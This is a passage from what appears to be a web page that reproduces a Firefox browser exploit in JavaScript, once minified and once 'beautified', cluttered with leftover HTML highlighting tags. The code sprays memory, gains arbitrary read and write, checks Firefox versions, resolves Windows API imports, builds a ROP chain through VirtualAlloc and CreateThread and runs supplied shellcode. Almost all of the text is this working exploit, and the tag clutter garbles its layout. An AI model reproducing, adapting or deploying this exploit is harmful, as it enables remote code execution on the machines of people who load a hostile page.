class="hljs-selector-tag">b</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>){convf64[0]=b;return convu32[a]},<span class="hljs-selector-tag"><span class="hljs-selector-tag">sprayArrays</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(){for(var b=Array(262138),a=0;262138&gt;a;a++)b[a]=fzero;for(a=0;a&lt;b.length;a+=512)b[a+1]=memory,b[a+21]=qword2Double(0,2),b[a+14]=qword2Double(arrBase+o1,0),b[a+(o1+8)/8]=qword2Double(arrBase+o2,0),b[a+(o2+0)/8]=qword2Double(2,0),b[a+(o2+8)/8]=qword2Double(arrBase+ o3,arrBase+13),b[a+(o3+0)/8]=qword2Double(16,0),b[a+(o3+24)/8]=qword2Double(2,0),b[a+(o3+32)/8]=qword2Double(arrBase+o5,arrBase+o4),b[a+(o4+0)/8]=qword2Double(0,arrBase+o6),b[a+(o5+0)/8]=qword2Double(arrBase+o7,0),b[a+(o6+8)/8]=qword2Double(2,0),b[a+(o7+8)/8]=qword2Double(arrBase+o7+16,0),b[a+(o7+16)/8]=qword2Double(0,4026531840),b[a+(o7+32)/8]=qword2Double(0,3220176896),b[a+(o7+48)/8]=qword2Double(2,0),b[a+(o7+56)/8]=qword2Double(1,0),b[a+(o7+96)/8]=qword2Double(arrBase+o8,arrBase+o8),b[a+(o7+112)/ 8]=qword2Double(arrBase+o9,arrBase+o9+16),b[a+(o7+168)/8]=qword2Double(0,2),b[a+(o9+0)/8]=qword2Double(arrBase+o10,2),b[a+(o10+0)/8]=qword2Double(2,0),b[a+(o10+8)/8]=qword2Double(0,268435456),b[a+(o11+8)/8]=qword2Double(arrBase+o11+16,0),b[a+(o11+16)/8]=qword2Double(0,4026531840),b[a+(o11+32)/8]=qword2Double(0,3220176896),b[a+(o11+48)/8]=qword2Double(2,0),b[a+(o11+56)/8]=qword2Double(1,0),b[a+(o11+96)/8]=qword2Double(arrBase+o8,arrBase+o8),b[a+(o11+112)/8]=qword2Double(arrBase+o9,arrBase+o9+16),b[a+ (o11+168)/8]=qword2Double(0,2);for(a=0;a&lt;spr.length;a++)spr[a]=b.slice(0)},<span class="hljs-selector-tag"><span class="hljs-selector-tag">vtable_offset</span></span>=300;/.*<span class="hljs-selector-tag"><span class="hljs-selector-tag">Firefox</span></span>\/(41\<span class="hljs-selector-class"><span class="hljs-selector-class">.0</span></span>(\.<span class="hljs-selector-attr"><span class="hljs-selector-attr">[1-2]</span></span>|)|42\<span class="hljs-selector-class"><span class="hljs-selector-class">.0</span></span>).*/<span class="hljs-selector-class"><span class="hljs-selector-class">.test</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">navigator</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.userAgent</span></span>)?<span class="hljs-selector-tag"><span class="hljs-selector-tag">vtable_offset</span></span>=304:/.*<span class="hljs-selector-tag"><span class="hljs-selector-tag">Firefox</span></span>\/(4<span class="hljs-selector-attr"><span class="hljs-selector-attr">[3-9]</span></span>|<span class="hljs-selector-attr"><span class="hljs-selector-attr">[5-9]</span></span>\<span class="hljs-selector-tag"><span class="hljs-selector-tag">d</span></span>+|<span class="hljs-selector-attr"><span class="hljs-selector-attr">[1-9]</span></span>\<span class="hljs-selector-tag"><span class="hljs-selector-tag">d</span></span>{2,})\..*/<span class="hljs-selector-class"><span class="hljs-selector-class">.test</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">navigator</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.userAgent</span></span>)&amp;&amp;(<span class="hljs-selector-tag"><span class="hljs-selector-tag">vtable_offset</span></span>=308); <span class="hljs-selector-tag"><span class="hljs-selector-tag">var</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">spr</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">Array</span></span>(400),<span class="hljs-selector-tag"><span class="hljs-selector-tag">arrBase</span></span>=805306416,<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropArrBuf</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">new</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">ArrayBuffer</span></span>(4096),<span class="hljs-selector-tag"><span class="hljs-selector-tag">o1</span></span>=176,<span class="hljs-selector-tag"><span class="hljs-selector-tag">o2</span></span>=256,<span class="hljs-selector-tag"><span class="hljs-selector-tag">o3</span></span>=768,<span class="hljs-selector-tag"><span class="hljs-selector-tag">o4</span></span>=832,<span class="hljs-selector-tag"><span class="hljs-selector-tag">o5</span></span>=864,<span class="hljs-selector-tag"><span class="hljs-selector-tag">o6</span></span>=928,<span class="hljs-selector-tag"><span class="hljs-selector-tag">o7</span></span>=1024,<span class="hljs-selector-tag"><span class="hljs-selector-tag">o8</span></span>=1280,<span class="hljs-selector-tag"><span class="hljs-selector-tag">o9</span></span>=1344,<span class="hljs-selector-tag"><span class="hljs-selector-tag">o10</span></span>=1376,<span class="hljs-selector-tag"><span class="hljs-selector-tag">o11</span></span>=1536,<span class="hljs-selector-tag"><span class="hljs-selector-tag">oRop</span></span>=1792,<span class="hljs-selector-tag"><span class="hljs-selector-tag">memory</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">new</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">Uint32Array</span></span>(16),<span class="hljs-selector-tag"><span class="hljs-selector-tag">len</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">memory</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.length</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">arr_index</span></span>=0,<span class="hljs-selector-tag"><span class="hljs-selector-tag">arr_offset</span></span>=0;<span class="hljs-selector-tag"><span class="hljs-selector-tag">fzero</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">qword2Double</span></span>(0,0);0!=<span class="hljs-selector-tag"><span class="hljs-selector-tag">thecode</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.length</span></span>%2&amp;&amp;(<span class="hljs-selector-tag"><span class="hljs-selector-tag">thecode</span></span>+="\<span class="hljs-selector-tag"><span class="hljs-selector-tag">u9090</span></span>");<span class="hljs-selector-tag"><span class="hljs-selector-tag">sprayArrays</span></span>();<span class="hljs-selector-tag"><span class="hljs-selector-tag">postMessage</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">arrBase</span></span>); <span class="hljs-selector-tag"><span class="hljs-selector-tag">for</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">memarrayloc</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">void</span></span> 0;<span class="hljs-selector-tag"><span class="hljs-selector-tag">void</span></span> 0==<span class="hljs-selector-tag"><span class="hljs-selector-tag">memarrayloc</span></span>;)<span class="hljs-selector-tag"><span class="hljs-selector-tag">for</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">i</span></span>=0;<span class="hljs-selector-tag"><span class="hljs-selector-tag">i</span></span>&lt;<span class="hljs-selector-tag"><span class="hljs-selector-tag">spr</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.length</span></span>;<span class="hljs-selector-tag"><span class="hljs-selector-tag">i</span></span>++)<span class="hljs-selector-tag"><span class="hljs-selector-tag">for</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">offset</span></span>=0;<span class="hljs-selector-tag"><span class="hljs-selector-tag">offset</span></span>&lt;<span class="hljs-selector-tag"><span class="hljs-selector-tag">spr</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i]</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.length</span></span>;<span class="hljs-selector-tag"><span class="hljs-selector-tag">offset</span></span>+=512)<span class="hljs-selector-tag"><span class="hljs-selector-tag">if</span></span>("<span class="hljs-selector-tag"><span class="hljs-selector-tag">object</span></span>"!=<span class="hljs-selector-tag"><span class="hljs-selector-tag">typeof</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">spr</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i]</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[offset+1]</span></span>){memarrayloc=doubleFromFloat(spr[i][offset+1],0);arr_index=i;arr_offset=offset;spr[i][offset+(o2+0)/8]=qword2Double(65,0);spr[i][offset+(o2+8)/8]=qword2Double(arrBase+o3,memarrayloc+27);for(j=0;33&gt;j;j++)spr[i][offset+(o2+16)/8+j]=qword2Double(memarrayloc+27,memarrayloc+27);spr[i][offset+(o3+8)/8]=qword2Double(0,0);spr[i][offset+(o5+0)/8]=qword2Double(arrBase+ o11,0);spr[i][offset+(o7+168)/8]=qword2Double(0,3);spr[i][offset+(o7+88)/8]=qword2Double(0,2);break}<span class="hljs-selector-tag"><span class="hljs-selector-tag">for</span></span>(;<span class="hljs-selector-tag"><span class="hljs-selector-tag">memory</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.length</span></span>==<span class="hljs-selector-tag"><span class="hljs-selector-tag">len</span></span>;);<span class="hljs-selector-tag"><span class="hljs-selector-tag">var</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">mem</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">new</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">Memory</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">memarrayloc</span></span>+48,<span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">b</span></span>){return memory[b/4]},<span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">b</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>){memory[b/4]=a}),<span class="hljs-selector-tag"><span class="hljs-selector-tag">xulPtr</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">mem</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.readDword</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">memarrayloc</span></span>+12);<span class="hljs-selector-tag"><span class="hljs-selector-tag">spr</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[arr_index]</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[arr_offset+1]</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropArrBuf</span></span>;<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropPtr</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">mem</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.readDword</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">arrBase</span></span>+8);<span class="hljs-selector-tag"><span class="hljs-selector-tag">spr</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[arr_index]</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[arr_offset+1]</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">null</span></span>;<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropBase</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">mem</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.readDword</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropPtr</span></span>+16);<span class="hljs-selector-tag"><span class="hljs-selector-tag">var</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">rop</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">new</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">ROP</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">mem</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">xulPtr</span></span>);<span class="hljs-selector-tag"><span class="hljs-selector-tag">rop</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.ropChain</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropBase</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">vtable_offset</span></span>,10,<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropArrBuf</span></span>); <span class="hljs-selector-tag"><span class="hljs-selector-tag">var</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">backupESP</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">rop</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.findSequence</span></span>(<span class="hljs-selector-attr"><span class="hljs-selector-attr">[137,1,195]</span></span>),<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">new</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">Uint32Array</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropArrBuf</span></span>);<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[0]</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">backupESP</span></span>;<span class="hljs-selector-tag"><span class="hljs-selector-tag">CreateThread</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">rop</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.pe</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.resolve_imported_function</span></span>("<span class="hljs-selector-tag"><span class="hljs-selector-tag">KERNEL32</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.dll</span></span>","<span class="hljs-selector-tag"><span class="hljs-selector-tag">CreateThread</span></span>");<span class="hljs-selector-tag"><span class="hljs-selector-tag">for</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">var</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">i</span></span>=0;<span class="hljs-selector-tag"><span class="hljs-selector-tag">i</span></span>&lt;<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.length</span></span>&amp;&amp;3435973836!=<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i]</span></span>;<span class="hljs-selector-tag"><span class="hljs-selector-tag">i</span></span>++);<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=3296825488;<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=2048;<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=1347469361;<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=1528949584;<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=3092271187;<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">CreateThread</span></span>;<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=3096498431;<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">arrBase</span></span>+16;<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=1955274891;<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=280697892;<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=704643071; <span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=2425406428;<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=4294957800;<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=2425393407;<span class="hljs-selector-tag"><span class="hljs-selector-tag">for</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">var</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">j</span></span>=0;<span class="hljs-selector-tag"><span class="hljs-selector-tag">j</span></span>&lt;<span class="hljs-selector-tag"><span class="hljs-selector-tag">thecode</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.length</span></span>;<span class="hljs-selector-tag"><span class="hljs-selector-tag">j</span></span>+=2)<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">thecode</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.charCodeAt</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">j</span></span>)+65536*<span class="hljs-selector-tag"><span class="hljs-selector-tag">thecode</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.charCodeAt</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">j</span></span>+1);<span class="hljs-selector-tag"><span class="hljs-selector-tag">spr</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[arr_index]</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[arr_offset]</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">qword2Double</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">arrBase</span></span>+16,0);<span class="hljs-selector-tag"><span class="hljs-selector-tag">spr</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[arr_index]</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[arr_offset+3]</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">qword2Double</span></span>(0,256);<span class="hljs-selector-tag"><span class="hljs-selector-tag">spr</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[arr_index]</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[arr_offset+2]</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">qword2Double</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropBase</span></span>,0);<span class="hljs-selector-tag"><span class="hljs-selector-tag">spr</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[arr_index]</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[arr_offset+(o11+168)/8]</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">qword2Double</span></span>(0,3);<span class="hljs-selector-tag"><span class="hljs-selector-tag">spr</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[arr_index]</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[arr_offset+(o11+88)/8]</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">qword2Double</span></span>(0,2);<span class="hljs-selector-tag"><span class="hljs-selector-tag">postMessage</span></span>("<span class="hljs-selector-tag"><span class="hljs-selector-tag">GREAT</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">SUCCESS</span></span>"); }; <span class="hljs-selector-tag"><span class="hljs-selector-tag">Beautified</span></span>: <span class="hljs-selector-tag"><span class="hljs-selector-tag">self</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.onmessage</span></span> = <span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">msg</span></span>) { thecode = msg.data; var pack = function (b) { var a = b &gt;&gt; 16; return String.fromCharCode(b &amp; 65535) + String.fromCharCode(a) }; <span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">Memory</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">b</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">f</span></span>) { this._base_addr=b; this._read=a; this._write=f; this._abs_read = function(a) { a &gt;= this._base_addr ? a = this._read( a - this._base_addr) : ( a = 4294967295 - this._base_addr + 1 + a, a = this._read(a) ); return 0&gt;a?4294967295+a+1:a }; <span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">._abs_write</span></span> = <span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">b</span></span>) { a &gt;= this._base_addr ? this._write(a - this._base_addr, b) : ( a = 4294967295 - this._base_addr + 1 + a, this._write(a,b) ) }; <span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.readByte</span></span> = <span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>) { return this.read(a) &amp; 255 }; <span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.readWord</span></span> = <span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>) { return this.read(a) &amp; 65535 }; <span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.readDword</span></span> = <span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>){ return this.read(a) }; <span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.read</span></span> = <span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">b</span></span>) { if (a%4) { var c = this._abs_read( a &amp; 4294967292), d = this._abs_read( a+4 &amp; 4294967292), e = a%4; return c&gt;&gt;&gt;8*e | d&lt;&lt;8*(4-e) } <span class="hljs-selector-tag"><span class="hljs-selector-tag">return</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">._abs_read</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>) }; <span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.readStr</span></span> = <span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>) { for(var b = "", c = 0;;) { if (32 == c) return ""; var d = this.readByte(a+c); if(0 == d) break; b += String.fromCharCode(d); c++ } <span class="hljs-selector-tag"><span class="hljs-selector-tag">return</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">b</span></span> }; <span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.write</span></span> = <span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>){} } <span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">PE</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">b</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>) { this.mem = b; this.export_table = this.module_base = void 0; this.export_table_size = 0; this.import_table = void 0; this.import_table_size = 0; this.find_module_base = function(a) { for(a &amp;= 4294901760; a; ) { if(23117 == this.mem.readWord(a)) return this.module_base=a; a -= 65536 } }; <span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">._resolve_pe_structures</span></span> = <span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>() { peFile = this.module_base + this.mem.readWord(this.module_base+60); if(17744 != this.mem.readDword(peFile)) throw"Bad NT Signature"; this.pe_file = peFile; this.optional_header = this.pe_file+36; this.export_directory = this.module_base+this.mem.readDword(this.pe_file+120); this.export_directory_size = this.mem.readDword(this.pe_file+124); this.import_directory=this.module_base+this.mem.readDword(this.pe_file+128); this.import_directory_size=this.mem.readDword(this.pe_file+132)}; <span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.resolve_imported_function</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">b</span></span>){ void 0==this.import_directory&amp;&amp;this._resolve_pe_structures(); for(var e=this.import_directory,c=e+this.import_directory_size;e&lt;c;){ var d=this.mem.readStr(this.mem.readDword(e+12)+this.module_base); if(a.toUpperCase()==d.toUpperCase()){ for(var c = this.mem.readDword(e) + this.module_base, e = this.mem.readDword(e+16) + this.module_base, d = this.mem.readDword(c), f = 0 ; 0 !=d ;) { if(this.mem.readStr(d+this.module_base+2).toUpperCase() == b.toUpperCase()) return this.mem.readDword(e+4*f); f++; d = this.mem.readDword(c+4*f) } <span class="hljs-selector-tag"><span class="hljs-selector-tag">break</span></span> } <span class="hljs-selector-tag"><span class="hljs-selector-tag">e</span></span>+=20 } <span class="hljs-selector-tag"><span class="hljs-selector-tag">return</span></span> 0 }; <span class="hljs-selector-tag"><span class="hljs-selector-tag">void</span></span> 0!=<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span> &amp;&amp; <span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.find_module_base</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>) } <span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">ROP</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">b</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>){ this.mem = b; this.pe = new PE(b,a); this.pe._resolve_pe_structures(); this.module_base = this.pe.module_base+4096; this.findSequence = function(a) { for(var b=0;;) { for(var e=0,c=0;c&lt;a.length;c++) if(this.mem.readByte(this.module_base+b+c)==a[c]&amp;&amp;e==c) e++; else break; if(e==a.length) return this.module_base+b; b++ } }; <span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.findStackPivot</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>() { return this.findSequence([148,195]) }; <span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.findPopRet</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>) { return this.findSequence([88,195]) }; <span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.ropChain</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">b</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">e</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">c</span></span>) { c = void 0 != c ? <span class="hljs-attribute"><span class="hljs-attribute">c </span></span>: new <span class="hljs-built_in"><span class="hljs-built_in">ArrayBuffer</span></span>(4096); c = new Uint32Array(c); var d = this.findStackPivot(), f = this.findPopRet("EAX"), g = this.pe.resolve_imported_function("kernel32.dll","VirtualAlloc"); c[0]= f+1; c[1]= f; c[2]= a+b+4*e+4; c[3]= d; for(i=0;i&lt;e;i++) c[(b&gt;&gt;2)+i] = d; d =(b+4&gt;&gt;2)+e; c[d++]=g; c[d++]=a+(b+4*e+28); c[d++]=a; c[d++]=4096; c[d++]=4096; c[d++]=64; c[d++]=3435973836; return c } } <span class="hljs-selector-tag"><span class="hljs-selector-tag">var</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">conv</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">new</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">ArrayBuffer</span></span>(8), <span class="hljs-selector-tag"><span class="hljs-selector-tag">convf64</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">new</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">Float64Array</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">conv</span></span>), <span class="hljs-selector-tag"><span class="hljs-selector-tag">convu32</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">new</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">Uint32Array</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">conv</span></span>), <span class="hljs-selector-tag"><span class="hljs-selector-tag">qword2Double</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">b</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>) { convu32[0]=b; convu32[1]=a; return convf64[0] }, <span 